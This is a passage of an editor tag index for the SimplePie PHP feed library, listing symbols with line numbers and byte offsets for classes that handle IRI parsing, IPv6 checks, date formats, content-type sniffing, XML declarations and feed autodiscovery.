"\xE2\x80\x8E", 'lsaquo;' => "\xE2\x80\xB9", 'lsquo;' => "\xE2\x80\x98", 'LT' => "\x3C", 'lt' => "\x3C", 'LT;' => "\x3C", 'lt;' => "\x3C", 'macr' => "\xC2\xAF", 'macr;' => "\xC2\xAF", 'mdash;' => "\xE2\x80\x94", 'micro' => "\xC2\xB5", 'micro;' => "\xC2\xB5", 'middot' => "\xC2\xB7", 'middot;' => "\xC2\xB7", 'minus;' => "\xE2\x88\x92", 'Mu;' => "\xCE\x9C", 'mu;' => "\xCE\xBC", 'nabla;' => "\xE2\x88\x87", 'nbsp' => "\xC2\xA0", 'nbsp;' => "\xC2\xA0", 'ndash;' => "\xE2\x80\x93", 'ne;' => "\xE2\x89\xA0", 'ni;' => "\xE2\x88\x8B", 'not' => "\xC2\xAC", 'not;' => "\xC2\xAC", 'notin;' => "\xE2\x88\x89", 'nsub;' => "\xE2\x8A\x84", 'Ntilde' => "\xC3\x91", 'ntilde' => "\xC3\xB1", 'Ntilde;' => "\xC3\x91", 'ntilde;' => "\xC3\xB1", 'Nu;' => "\xCE\x9D", 'nu;' => "\xCE\xBD", 'Oacute' => "\xC3\x93", 'oacute' => "\xC3\xB3", 'Oacute;' => "\xC3\x93", 'oacute;' => "\xC3\xB3", 'Ocirc' => "\xC3\x94", 'ocirc' => "\xC3\xB4", 'Ocirc;' => "\xC3\x94", 'ocirc;' => "\xC3\xB4", 'OElig;' => "\xC5\x92", 'oelig;' => "\xC5\x93", 'Ograve' => "\xC3\x92", 'ograve' => "\xC3\xB2", 'Ograve;' => "\xC3\x92", 'ograve;' => "\xC3\xB2", 'oline;' => "\xE2\x80\xBE", 'Omega;' => "\xCE\xA9", 'omega;' => "\xCF\x89", 'Omicron;' => "\xCE\x9F", 'omicron;' => "\xCE\xBF", 'oplus;' => "\xE2\x8A\x95", 'or;' => "\xE2\x88\xA8", 'ordf' => "\xC2\xAA", 'ordf;' => "\xC2\xAA", 'ordm' => "\xC2\xBA", 'ordm;' => "\xC2\xBA", 'Oslash' => "\xC3\x98", 'oslash' => "\xC3\xB8", 'Oslash;' => "\xC3\x98", 'oslash;' => "\xC3\xB8", 'Otilde' => "\xC3\x95", 'otilde' => "\xC3\xB5", 'Otilde;' => "\xC3\x95", 'otilde;' => "\xC3\xB5", 'otimes;' => "\xE2\x8A\x97", 'Ouml' => "\xC3\x96", 'ouml' => "\xC3\xB6", 'Ouml;' => "\xC3\x96", 'ouml;' => "\xC3\xB6", 'para' => "\xC2\xB6", 'para;' => "\xC2\xB6", 'part;' => "\xE2\x88\x82", 'permil;' => "\xE2\x80\xB0", 'perp;' => "\xE2\x8A\xA5", 'Phi;' => "\xCE\xA6", 'phi;' => "\xCF\x86", 'Pi;' => "\xCE\xA0", 'pi;' => "\xCF\x80", 'piv;' => "\xCF\x96", 'plusmn' => "\xC2\xB1", 'plusmn;' => "\xC2\xB1", 'pound' => "\xC2\xA3", 'pound;' => "\xC2\xA3", 'Prime;' => "\xE2\x80\xB3", 'prime;' => "\xE2\x80\xB2", 'prod;' => "\xE2\x88\x8F", 'prop;' => "\xE2\x88\x9D", 'Psi;' => "\xCE\xA8", 'psi;' => "\xCF\x88", 'QUOT' => "\x22", 'quot' => "\x22", 'QUOT;' => "\x22", 'quot;' => "\x22", 'radic;' => "\xE2\x88\x9A", 'rang;' => "\xE3\x80\x89", 'raquo' => "\xC2\xBB", 'raquo;' => "\xC2\xBB", 'rArr;' => "\xE2\x87\x92", 'rarr;' => "\xE2\x86\x92", 'rceil;' => "\xE2\x8C\x89", 'rdquo;' => "\xE2\x80\x9D", 'real;' => "\xE2\x84\x9C", 'REG' => "\xC2\xAE", 'reg' => "\xC2\xAE", 'REG;' => "\xC2\xAE", 'reg;' => "\xC2\xAE", 'rfloor;' => "\xE2\x8C\x8B", 'Rho;' => "\xCE\xA1", 'rho;' => "\xCF\x81", 'rlm;' => "\xE2\x80\x8F", 'rsaquo;' => "\xE2\x80\xBA", 'rsquo;' => "\xE2\x80\x99", 'sbquo;' => "\xE2\x80\x9A", 'Scaron;' => "\xC5\xA0", 'scaron;' => "\xC5\xA1", 'sdot;' => "\xE2\x8B\x85", 'sect' => "\xC2\xA7", 'sect;' => "\xC2\xA7", 'shy' => "\xC2\xAD", 'shy;' => "\xC2\xAD", 'Sigma;' => "\xCE\xA3", 'sigma;' => "\xCF\x83", 'sigmaf;' => "\xCF\x82", 'sim;' => "\xE2\x88\xBC", 'spades;' => "\xE2\x99\xA0", 'sub;' => "\xE2\x8A\x82", 'sube;' => "\xE2\x8A\x86", 'sum;' => "\xE2\x88\x91", 'sup;' => "\xE2\x8A\x83", 'sup1' => "\xC2\xB9", 'sup1;' => "\xC2\xB9", 'sup2' => "\xC2\xB2", 'sup2;' => "\xC2\xB2", 'sup3' => "\xC2\xB3", 'sup3;' => "\xC2\xB3", 'supe;' => "\xE2\x8A\x87", 'szlig' => "\xC3\x9F", 'szlig;' => "\xC3\x9F", 'Tau;' => "\xCE\xA4", 'tau;' => "\xCF\x84", 'there4;' => "\xE2\x88\xB4", 'Theta;' => "\xCE\x98", 'theta;' => "\xCE\xB8", 'thetasym;' => "\xCF\x91", 'thinsp;' => "\xE2\x80\x89", 'THORN' => "\xC3\x9E", 'thorn' => "\xC3\xBE", 'THORN;' => "\xC3\x9E", 'thorn;' => "\xC3\xBE", 'tilde;' => "\xCB\x9C", 'times' => "\xC3\x97", 'times;' => "\xC3\x97", 'TRADE;' => "\xE2\x84\xA2", 'trade;' => "\xE2\x84\xA2", 'Uacute' => "\xC3\x9A", 'uacute' => "\xC3\xBA", 'Uacute;' => "\xC3\x9A", 'uacute;' => "\xC3\xBA", 'uArr;' => "\xE2\x87\x91", 'uarr;' => "\xE2\x86\x91", 'Ucirc' => "\xC3\x9B", 'ucirc' => "\xC3\xBB", 'Ucirc;' => "\xC3\x9B", 'ucirc;' => "\xC3\xBB", 'Ugrave' => "\xC3\x99", 'ugrave' => "\xC3\xB9", 'Ugrave;' => "\xC3\x99", 'ugrave;' => "\xC3\xB9", 'uml' => "\xC2\xA8", 'uml;' => "\xC2\xA8", 'upsih;' => "\xCF\x92", 'Upsilon;' => "\xCE\xA5", 'upsilon;' => "\xCF\x85", 'Uuml' => "\xC3\x9C", 'uuml' => "\xC3\xBC", 'Uuml;' => "\xC3\x9C", 'uuml;' => "\xC3\xBC", 'weierp;' => "\xE2\x84\x98", 'Xi;' => "\xCE\x9E", 'xi;' => "\xCE\xBE", 'Yacute' => "\xC3\x9D", 'yacute' => "\xC3\xBD", 'Yacute;' => "\xC3\x9D", 'yacute;' => "\xC3\xBD", 'yen' => "\xC2\xA5", 'yen;' => "\xC2\xA5", 'yuml' => "\xC3\xBF", 'Yuml;' => "\xC5\xB8", 'yuml;' => "\xC3\xBF", 'Zeta;' => "\xCE\x96", 'zeta;' => "\xCE\xB6", 'zwj;' => "\xE2\x80\x8D", 'zwnj;' => "\xE2\x80\x8C");entities11638,308539
				for ($i = 0, $match = null; $i < 9 && $this->consume() !== false; $i++)match11640,317425
					$consumed = substr($this->consumed, 1);consumed11642,317507
						$match = $consumed;match11645,317597
 					$this->data = substr_replace($this->data, $entities[$match], $this->position - strlen($consumed) - 1, strlen($match) + 1);data11651,317668
class SimplePie_IRISimplePie_IRI11664,317957
	var $scheme;scheme11672,318040
	var $userinfo;userinfo11680,318126
	var $host;host11688,318202
	var $port;port11696,318274
	var $path;path11704,318346
	var $query;query11712,318419
	var $fragment;fragment11720,318496
	var $valid = array();valid11728,318608
	var $valid = array();valid11728,318608
	function __toString()__toString11736,318755
	function SimplePie_IRI($iri)SimplePie_IRI11748,318947
		$iri = (string) $iri;iri11750,318980
			$parsed = $this->parse_iri($iri);parsed11753,319027
	function absolutize($base, $relative)absolutize11771,319489
		$relative = (string) $relative;relative11773,319531
			$relative =& new SimplePie_IRI($relative);relative11776,319593
				$target = $relative;target11779,319685
					$target = $relative;target11785,319809
					$target =& new SimplePie_IRI('');target11790,319903
				$target = $relative;target11833,321234
			$target = $base;target11838,321279
	function parse_iri($iri)parse_iri11850,321468
	function remove_dot_segments($input)remove_dot_segments11867,321914
		$output = '';output11869,321955
		while (strpos($input, './') !== false || strpos($input, '/.') !== false || $input === '.' || $input === '..')input11870,321971
				$input = substr($input, 3);input11875,322254
				$input = substr($input, 2);input11879,322335
				$input = substr_replace($input, '/', 0, 3);input11884,322589
				$input = '/';input11888,322675
				$input = substr_replace($input, '/', 0, 4);input11893,323001
				$output = substr_replace($output, '', strrpos($output, '/'));output11894,323049
				$input = '/';input11898,323154
				$output = substr_replace($output, '', strrpos($output, '/'));output11899,323172
			elseif ($input === '.' || $input === '..')input11902,323353
				$input = '';input11904,323404
				$input = substr_replace($input, '', 0, $pos);input11910,323770
				$input = '';input11915,323861
	function replace_invalid_with_pct_encoding($string, $valid_chars, $case = SIMPLEPIE_SAME_CASE, $iprivate = false)replace_invalid_with_pct_encoding11929,324126
	function replace_invalid_with_pct_encoding($string, $valid_chars, $case = SIMPLEPIE_SAME_CASE, $iprivate = false)case11929,324126
		$string = preg_replace_callback('/(?:%[A-Fa-f0-9]{2})+/', array(&$this, 'remove_iunreserved_percent_encoded'), $string);string11932,324300
		$string = preg_replace('/%(?![A-Fa-f0-9]{2})/', '%25', $string);string11935,324464
		$position = 0;position11942,324817
		$strlen = strlen($string);strlen11943,324834
			$value = ord($string[$position]);value11946,324943
			$start = $position;start11949,325002
			$valid = true;valid11952,325056
				$character = ($value & 0x1F) << 6;character11958,325194
				$length = 2;length11959,325233
				$remaining = 1;remaining11960,325250
				$character = ($value & 0x0F) << 12;character11965,325344
				$length = 3;length11966,325384
				$remaining = 2;remaining11967,325401
				$character = ($value & 0x07) << 18;character11972,325494
				$length = 4;length11973,325534
				$remaining = 3;remaining11974,325551
				$valid = false;valid11979,325609
				$length = 1;length11980,325629
				$remaining = 0;remaining11981,325646
						$value = ord($string[$position]);value11990,325797
							$valid = false;valid12000,326127
					$position = $strlen - 1;position12008,326220
					$valid = false;valid12009,326250
					$string = substr_replace($string, sprintf('%%%02X', ord($string[$j])), $j, 1);string12045,327186
			$string = strtolower($string);string12056,327399
			$string = strtoupper($string);string12060,327480
	 * Callback function for preg_replace_callback.for12067,327546
	function remove_iunreserved_percent_encoded($match)remove_iunreserved_percent_encoded12076,327800
		$bytes = explode('%', $match[0]);bytes12080,328003
		$string = '';string12085,328210
		$remaining = 0;remaining12086,328226
		for ($i = 1, $len = count($bytes); $i < $len; $i++)len12089,328309
			$value = hexdec($bytes[$i]);value12091,328367
				$start = $i;start12097,328490
				$valid = true;valid12100,328539
					$character = $value;character12105,328615
					$length = 1;length12106,328641
					$character = ($value & 0x1F) << 6;character12111,328735
					$length = 2;length12112,328775
					$remaining = 1;remaining12113,328793
					$character = ($value & 0x0F) << 12;character12118,328892
					$length = 3;length12119,328933
					$remaining = 2;remaining12120,328951
					$character = ($value & 0x07) << 18;character12125,329049
					$length = 4;length12126,329090
					$remaining = 3;remaining12127,329108
					$valid = false;valid12132,329171
					$remaining = 0;remaining12133,329192
					$valid = false;valid12148,329579
					$remaining = 0;remaining12149,329600
					|| $character === 0x2Fcharacter12172,330327
	function is_valid()is_valid12214,331188
	function set_scheme($scheme)set_scheme12227,331455
		if ($scheme === null || $scheme === '')scheme12229,331488
			$this->scheme = null;scheme12231,331534
			$len = strlen($scheme);len12235,331574
						$this->scheme = null;scheme12241,331748
						$this->scheme = null;scheme12249,331961
			$this->scheme = strtolower($scheme);scheme12254,332063
	function set_authority($authority)set_authority12268,332350
			$userinfo = substr($authority, 0, $userinfo_end);userinfo12272,332453
			$authority = substr($authority, $userinfo_end + 1);authority12273,332506
			$userinfo = null;userinfo12277,332576
			$port = substr($authority, $port_start + 1);port12282,332663
			$authority = substr($authority, 0, $port_start);authority12283,332711
			$port = null;port12287,332778
	function set_userinfo($userinfo)set_userinfo12300,333002
		if ($userinfo === null || $userinfo === '')userinfo12302,333039
			$this->userinfo = null;userinfo12304,333089
			$this->userinfo = $this->replace_invalid_with_pct_encoding($userinfo, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&\'()*+,;=:');userinfo12308,333131
	function set_host($host)set_host12322,333525
		if ($host === null || $host === '')host12324,333554
			$this->host = null;host12326,333596
				$this->host = $host;host12334,333803
				$this->host = null;host12340,333902
			$this->host = $this->replace_invalid_with_pct_encoding($host, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&\'()*+,;=', SIMPLEPIE_LOWERCASE);host12347,334004
	function set_port($port)set_port12361,334412
		if ($port === null || $port === '')port12363,334441
			$this->port = null;port12365,334483
			$this->port = (int) $port;port12371,334625
			$this->port = null;port12377,334724
	function set_path($path)set_path12390,334903
		if ($path === null || $path === '')path12392,334932
			$this->path = null;path12394,334974
		elseif (substr($path, 0, 2) === '//' && $this->userinfo === null && $this->host === null && $this->port === null)userinfo12398,335055
			$this->path = null;path12400,335175
			$this->path = $this->replace_invalid_with_pct_encoding($path, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&\'()*+,;=@/');path12406,335269
				$this->path = $this->remove_dot_segments($this->path);path12409,335455
	function set_query($query)set_query12423,335675
		if ($query === null || $query === '')query12425,335706
			$this->query = null;query12427,335750
			$this->query = $this->replace_invalid_with_pct_encoding($query, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$\'()*+,;:@/?&=');query12431,335789
	function set_fragment($fragment)set_fragment12444,336103
		if ($fragment === null || $fragment === '')fragment12446,336140
			$this->fragment = null;fragment12448,336190
			$this->fragment = $this->replace_invalid_with_pct_encoding($fragment, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&\'()*+,;=:@/?');fragment12452,336232
	function get_iri()get_iri12464,336529
		$iri = '';iri12466,336552
	function get_scheme()get_scheme12504,337079
	function get_authority()get_authority12515,337216
		$authority = '';authority12517,337245
	function get_userinfo()get_userinfo12547,337654
	function get_host()get_host12558,337781
	function get_port()get_port12569,337900
	function get_path()get_path12580,338019
	function get_query()get_query12591,338139
	function get_fragment()get_fragment12602,338264
class SimplePie_Net_IPv6SimplePie_Net_IPv612620,338742
	function removeNetmaskSpec($ip)removeNetmaskSpec12631,339013
			$addr = $ip;addr12639,339143
	 * function expects an valid IPv6 address and expands the '::' toexpects12648,339295
	function Uncompress($ip)Uncompress12659,339627
		$uip = SimplePie_Net_IPv6::removeNetmaskSpec($ip);uip12661,339656
		$c1 = -1;c112662,339709
		$c2 = -1;c212663,339721
				$c1 = -1;c112669,339839
				$pos = 0;pos12673,339871
					$c1 = $pos;c112676,339937
					$c1 = 0;c112680,339975
				$c2 = -1;c212685,340025
				$pos = 0;pos12689,340057
					$c2 = $pos;c212692,340123
					$c2 = 0;c212696,340161
			if ($c1 === -1 && $c2 === -1)c212704,340242
				$uip = '0:0:0:0:0:0:0:0';uip12706,340280
				$fill = str_repeat('0:', 7 - $c2);fill12711,340356
				$uip =	str_replace('::', $fill, $uip);uip12712,340395
				$fill = str_repeat(':0', 7 - $c1);fill12717,340484
				$uip =	str_replace('::', $fill, $uip);uip12718,340523
				$fill = str_repeat(':0:', 6 - $c2 - $c1);fill12723,340599
				$uip =	str_replace('::', $fill, $uip);uip12724,340645
				$uip =	str_replace('::', ':', $uip);uip12725,340688
	function SplitV64($ip)SplitV6412745,341185
		$ip = SimplePie_Net_IPv6::Uncompress($ip);ip12747,341212
			$pos = strrpos($ip, ':');pos12750,341285
			$ipPart = explode('_', $ip);ipPart12752,341334
	function checkIPv6($ip)checkIPv612771,341647
		$ipPart = SimplePie_Net_IPv6::SplitV64($ip);ipPart12773,341675
		$count = 0;count12774,341722
			$ipv6 = explode(':', $ipPart[0]);ipv612777,341766
				$dec = hexdec($ipv6[$i]);dec12780,341849
				$hex = strtoupper(preg_replace('/^[0]{1,3}(.*[0-9a-fA-F])$/', '\\1', $ipv6[$i]));hex12781,341879
				if ($ipv6[$i] >= 0 && $dec <= 65535 && $hex === strtoupper(dechex($dec)))hex12782,341965
				$ipv4 = explode('.', $ipPart[1]);ipv412793,342175
				$count = 0;count12794,342213
class SimplePie_Parse_DateSimplePie_Parse_Date12825,342577
	var $date;date12833,342673
	var $day = array(day12841,342807
	var $day = array(day12841,342807
	var $month = array(month12930,344327
	var $month = array(month12930,344327
	var $timezone = array(timezone13075,346810
	var $timezone = array(timezone13075,346810
	var $day_pcre;day_pcre13283,350684
	var $month_pcre;month_pcre13291,350802
	var $built_in = array();built_in13299,350911
	var $built_in = array();built_in13299,350911
	var $user = array();user13307,351028
	var $user = array();user13307,351028
	function SimplePie_Parse_Date()SimplePie_Parse_Date13315,351194
		$this->day_pcre = '(' . implode(array_keys($this->day), '|') . ')';day_pcre13317,351230
		$this->month_pcre = '(' . implode(array_keys($this->month), '|') . ')';month_pcre13318,351300
		static $cache;cache13320,351375
			$all_methods = get_class_methods($this);all_methods13323,351436
	function get()get13345,351787
		static $object;object13347,351806
			$object =& new SimplePie_Parse_Date;object13350,351844
	function parse($date)parse13363,352085
	function add_callback($callback)add_callback13391,352544
			trigger_error('User-supplied function must be a valid callback', E_USER_WARNING);must13399,352660
	function date_w3cdtf($date)date_w3cdtf13411,353036
		static $pcre;pcre13413,353068
			$year = '([0-9]{4})';year13416,353102
			$month = $day = $hour = $minute = $second = '([0-9]{2})';month13417,353127
			$decimal = '([0-9]*)';decimal13418,353188
			$zone = '(?:(Z)|([+\-])([0-9]{1,2}):?([0-9]{1,2}))';zone13419,353214
			$pcre = '/^' . $year . '(?:-?' . $month . '(?:-?' . $day . '(?:[Tt\x09\x20]+' . $hour . '(?::?' . $minute . '(?::?' . $second . '(?:.' . $decimal . ')?)?)?' . $zone . ')?)?)?$/';pcre13420,353270
				$timezone = $match[10] * 3600;timezone13453,353972
					$timezone = 0 - $timezone;timezone13457,354074
				$timezone = 0;timezone13462,354130
			$second = round($match[6] + $match[7] / pow(10, strlen($match[7])));second13466,354235
	function remove_rfc2822_comments($string)remove_rfc2822_comments13483,354602
		$string = (string) $string;string13485,354648
		$position = 0;position13486,354678
		$length = strlen($string);length13487,354695
		$depth = 0;depth13488,354724
		$output = '';output13490,354739
			$position = $pos + 1;position13495,354904
	function date_rfc2822($date)date_rfc282213543,355647
		static $pcre;pcre13545,355680
			$wsp = '[\x09\x20]';wsp13548,355714
			$fws = '(?:' . $wsp . '+|' . $wsp . '*(?:\x0D\x0A' . $wsp . '+)+)';fws13549,355738
			$optional_fws = $fws . '?';optional_fws13550,355809
			$day_name = $this->day_pcre;day_name13551,355840
			$month = $this->month_pcre;month13552,355872
			$day = '([0-9]{1,2})';day13553,355903
			$hour = $minute = $second = '([0-9]{2})';hour13554,355929
			$year = '([0-9]{2,4})';year13555,355974
			$num_zone = '([+\-])([0-9]{2})([0-9]{2})';num_zone13556,356001
			$character_zone = '([A-Z]{1,5})';character_zone13557,356047
			$zone = '(?:' . $num_zone . '|' . $character_zone . ')';zone13558,356084
			$pcre = '/(?:' . $optional_fws . $day_name . $optional_fws . ',)?' . $optional_fws . $day . $fws . $month . $fws . $year . $fws . $hour . $optional_fws . ':' . $optional_fws . $minute . '(?:' . $optional_fws . ':' . $optional_fws . $second . ')?' . $fws . $zone . '/i';pcre13559,356144
			$month = $this->month[strtolower($match[3])];month13579,356739
				$timezone = $match[9] * 3600;timezone13584,356842
					$timezone = 0 - $timezone;timezone13588,356943
				$timezone = $this->timezone[strtoupper($match[11])];timezone13594,357075
				$timezone = 0;timezone13599,357191
				$second = $match[7];second13615,357453
				$second = 0;second13619,357496
	function date_rfc850($date)date_rfc85013636,357745
		static $pcre;pcre13638,357777
			$space = '[\x09\x20]+';space13641,357811
			$day_name = $this->day_pcre;day_name13642,357838
			$month = $this->month_pcre;month13643,357870
			$day = '([0-9]{1,2})';day13644,357901
			$year = $hour = $minute = $second = '([0-9]{2})';year13645,357927
			$zone = '([A-Z]{1,5})';zone13646,357980
			$pcre = '/^' . $day_name . ',' . $space . $day . '-' . $month . '-' . $year . $space . $hour . ':' . $minute . ':' . $second . $space . $zone . '$/i';pcre13647,358007
			$month = $this->month[strtolower($match[3])];month13664,358360
				$timezone = $this->timezone[strtoupper($match[8])];timezone13669,358494
				$timezone = 0;timezone13674,358609
	function date_asctime($date)date_asctime13701,358998
		static $pcre;pcre13703,359031
			$space = '[\x09\x20]+';space13706,359065
			$wday_name = $this->day_pcre;wday_name13707,359092
			$mon_name = $this->month_pcre;mon_name13708,359125
			$day = '([0-9]{1,2})';day13709,359159
			$hour = $sec = $min = '([0-9]{2})';hour13710,359185
			$year = '([0-9]{4})';year13711,359224
			$terminator = '\x0A?\x00?';terminator13712,359249
			$pcre = '/^' . $wday_name . $space . $mon_name . $space . $day . $space . $hour . ':' . $min . ':' . $sec . $space . $year . $terminator . '$/i';pcre13713,359280
			$month = $this->month[strtolower($match[2])];month13728,359601
	function date_strtotime($date)date_strtotime13743,359869
		$strtotime = strtotime($date);strtotime13745,359904
		if ($strtotime === -1 || $strtotime === false)strtotime13746,359937
class SimplePie_Content_Type_SnifferSimplePie_Content_Type_Sniffer13762,360112
	var $file;file13770,360225
	 * Create an instance of the class with the input filewith13773,360243
	function SimplePie_Content_Type_Sniffer($file)SimplePie_Content_Type_Sniffer13778,360386
		$this->file = $file;file13780,360437
	function get_type()get_type13789,360583
				$official = substr($this->file->headers['content-type'], 0, $pos);official13803,361075
				$official = $this->file->headers['content-type'];official13807,361164
			$official = strtolower($official);official13809,361223
				|| $official === 'application/unknown')official13812,361301
				|| $official === 'text/xml'official13817,361428
				|| $official === 'application/xml')official13818,361460
	function text_or_binary()text_or_binary13854,361973
	function unknown()unknown13879,362517
		$ws = strspn($this->file->body, "\x09\x0A\x0B\x0C\x0D\x20");ws13881,362540
	function image()image13925,363615
	function feed_or_html()feed_or_html13956,364190
		$len = strlen($this->file->body);len13958,364218
		$pos = strspn($this->file->body, "\x09\x0A\x0D\x20");pos13959,364254
class SimplePie_XML_Declaration_ParserSimplePie_XML_Declaration_Parser14038,365682
	var $version = '1.0';version14046,365788
	var $version = '1.0';version14046,365788
	var $encoding = 'UTF-8';encoding14054,365874
	var $encoding = 'UTF-8';encoding14054,365874
	var $standalone = false;standalone14062,365963
	var $standalone = false;standalone14062,365963
	var $state = 'before_version_name';state14070,366079
	var $state = 'before_version_name';state14070,366079
	var $data = '';data14078,366182
	var $data = '';data14078,366182
	var $data_length = 0;data_length14086,366322
	var $data_length = 0;data_length14086,366322
	var $position = 0;position14094,366429
	var $position = 0;position14094,366429
	 * Create an instance of the class with the input datawith14097,366455
	function SimplePie_XML_Declaration_Parser($data)SimplePie_XML_Declaration_Parser14102,366574
		$this->data = $data;data14104,366627
		$this->data_length = strlen($this->data);data_length14105,366650
	function parse()parse14114,366807
			$state = $this->state;state14118,366903
		$this->data = '';data14121,366953
			$this->version = '';version14128,367039
			$this->encoding = '';encoding14129,367063
			$this->standalone = '';standalone14130,367088
	function has_data()has_data14141,367286
	function skip_whitespace()skip_whitespace14151,367471
		$whitespace = strspn($this->data, "\x09\x0A\x0D\x20", $this->position);whitespace14153,367502
	function get_value()get_value14161,367661
		$quote = substr($this->data, $this->position, 1);quote14163,367686
		if ($quote === '"' || $quote === "'")quote14164,367738
			$len = strcspn($this->data, $quote, $this->position);len14167,367804
				$value = substr($this->data, $this->position, $len);value14170,367892
	function before_version_name()before_version_name14178,368030
			$this->state = 'version_name';state14182,368101
			$this->state = false;state14186,368150
	function version_name()version_name14190,368183
			$this->state = 'version_equals';state14196,368330
			$this->state = false;state14200,368381
	function version_equals()version_equals14204,368414
			$this->state = 'version_value';state14210,368554
			$this->state = false;state14214,368604
	function version_value()version_value14218,368637
				$this->state = 'encoding_name';state14225,368773
				$this->state = 'emit';state14229,368827
			$this->state = false;state14234,368874
	function encoding_name()encoding_name14238,368907
			$this->state = 'encoding_equals';state14244,369056
			$this->state = 'standalone_name';state14248,369108
	function encoding_equals()encoding_equals14252,369153
			$this->state = 'encoding_value';state14258,369294
			$this->state = false;state14262,369345
	function encoding_value()encoding_value14266,369378
				$this->state = 'standalone_name';state14273,369516
				$this->state = 'emit';state14277,369572
			$this->state = false;state14282,369619
	function standalone_name()standalone_name14286,369652
			$this->state = 'standalone_equals';state14292,369807
			$this->state = false;state14296,369861
	function standalone_equals()standalone_equals14300,369894
			$this->state = 'standalone_value';state14306,370037
			$this->state = false;state14310,370090
	function standalone_value()standalone_value14314,370123
					$this->standalone = true;standalone14321,370244
					$this->standalone = false;standalone14325,370303
					$this->state = false;state14329,370361
				$this->state = false;state14336,370467
				$this->state = 'emit';state14340,370511
			$this->state = false;state14345,370558
class SimplePie_LocatorSimplePie_Locator14350,370593
	var $useragent;useragent14352,370619
	var $timeout;timeout14353,370636
	var $file;file14354,370651
	var $local = array();local14355,370663
	var $local = array();local14355,370663
	var $elsewhere = array();elsewhere14356,370686
	var $elsewhere = array();elsewhere14356,370686
	var $file_class = 'SimplePie_File';file_class14357,370713
	var $file_class = 'SimplePie_File';file_class14357,370713
	var $cached_entities = array();cached_entities14358,370750
	var $cached_entities = array();cached_entities14358,370750
	var $http_base;http_base14359,370783
	var $base;base14360,370800
	var $base_location = 0;base_location14361,370812
	var $base_location = 0;base_location14361,370812
	var $checked_feeds = 0;checked_feeds14362,370837
	var $checked_feeds = 0;checked_feeds14362,370837
	var $max_checked_feeds = 10;max_checked_feeds14363,370862
	var $max_checked_feeds = 10;max_checked_feeds14363,370862
	var $content_type_sniffer_class = 'SimplePie_Content_Type_Sniffer';content_type_sniffer_class14364,370892
	var $content_type_sniffer_class = 'SimplePie_Content_Type_Sniffer';content_type_sniffer_class14364,370892
	function SimplePie_Locator(&$file, $timeout = 10, $useragent = null, $file_class = 'SimplePie_File', $max_checked_feeds = 10, $content_type_sniffer_class = 'SimplePie_Content_Type_Sniffer')SimplePie_Locator14366,370962
	function SimplePie_Locator(&$file, $timeout = 10, $useragent = null, $file_class = 'SimplePie_File', $max_checked_feeds = 10, $content_type_sniffer_class = 'SimplePie_Content_Type_Sniffer')timeout14366,370962
		$this->file =& $file;file14368,371156
		$this->file_class = $file_class;file_class14369,371180
		$this->useragent = $useragent;useragent14370,371215
		$this->timeout = $timeout;timeout14371,371248
		$this->max_checked_feeds = $max_checked_feeds;max_checked_feeds14372,371277
		$this->content_type_sniffer_class = $content_type_sniffer_class;content_type_sniffer_class14373,371326
	function find($type = SIMPLEPIE_LOCATOR_ALL, &$working)find14376,371397
			$sniffer =& new $this->content_type_sniffer_class($this->file);sniffer14385,371586
		if ($type & SIMPLEPIE_LOCATOR_AUTODISCOVERY && $working = $this->autodiscovery())working14397,371800
			if ($type & SIMPLEPIE_LOCATOR_LOCAL_EXTENSION && $working = $this->extension($this->local))working14404,372093
			if ($type & SIMPLEPIE_LOCATOR_LOCAL_BODY && $working = $this->body($this->local))working14409,372220
			if ($type & SIMPLEPIE_LOCATOR_REMOTE_EXTENSION && $working = $this->extension($this->elsewhere))working14414,372337
			if ($type & SIMPLEPIE_LOCATOR_REMOTE_BODY && $working = $this->body($this->elsewhere))working14419,372469
	function is_feed(&$file)is_feed14427,372613
			$sniffer =& new $this->content_type_sniffer_class($file);sniffer14431,372698
			$sniffed = $sniffer->get_type();sniffed14432,372759
	function get_base()get_base14452,373124
		$this->http_base = $this->file->url;http_base14454,373148
		$this->base = $this->http_base;base14455,373187
		$elements = SimplePie_Misc::get_element('base', $this->file->body);elements14456,373221
				$this->base = SimplePie_Misc::absolutize_url(trim($element['attribs']['href']['data']), $this->http_base);base14461,373385
				$this->base_location = $element['offset'];base_location14462,373496
	function autodiscovery()autodiscovery14468,373567
		$links = array_merge(SimplePie_Misc::get_element('link', $this->file->body), SimplePie_Misc::get_element('a', $this->file->body), SimplePie_Misc::get_element('area', $this->file->body));links14470,373596
		$done = array();done14471,373785
		$feeds = array();feeds14472,373804
				$rel = array_unique(SimplePie_Misc::space_seperated_tokens(strtolower($link['attribs']['rel']['data'])));rel14481,374030
					$href = SimplePie_Misc::absolutize_url(trim($link['attribs']['href']['data']), $this->base);href14485,374195
					$href = SimplePie_Misc::absolutize_url(trim($link['attribs']['href']['data']), $this->http_base);href14489,374314
					$feed =& new $this->file_class($href, $this->timeout, 5, null, $this->useragent);feed14495,374760
	function get_links()get_links14514,375216
		$links = SimplePie_Misc::get_element('a', $this->file->body);links14516,375241
				$href = trim($link['attribs']['href']['data']);href14521,375390
				$parsed = SimplePie_Misc::parse_url($href);parsed14522,375442
						$href = SimplePie_Misc::absolutize_url(trim($link['attribs']['href']['data']), $this->base);href14527,375643
						$href = SimplePie_Misc::absolutize_url(trim($link['attribs']['href']['data']), $this->http_base);href14531,375766
					$current = SimplePie_Misc::parse_url($this->file->url);current14534,375878
		$this->local = array_unique($this->local);local14547,376145
		$this->elsewhere = array_unique($this->elsewhere);elsewhere14548,376190
	function extension(&$array)extension14556,376342
		foreach ($array as $key => $value)key14558,376374
				$feed =& new $this->file_class($value, $this->timeout, 5, null, $this->useragent);feed14567,376618
	function body(&$array)body14581,377004
		foreach ($array as $key => $value)key14583,377031
				$feed =& new $this->file_class($value, $this->timeout, 5, null, $this->useragent);feed14592,377236
class SimplePie_ParserSimplePie_Parser14607,377624
	var $error_code;error_code14609,377649
	var $error_string;error_string14610,377667
	var $current_line;current_line14611,377687
	var $current_column;current_column14612,377707
	var $current_byte;current_byte14613,377729
	var $separator = ' ';separator14614,377749
	var $separator = ' ';separator14614,377749
	var $namespace = array('');namespace14615,377772
	var $namespace = array('');namespace14615,377772
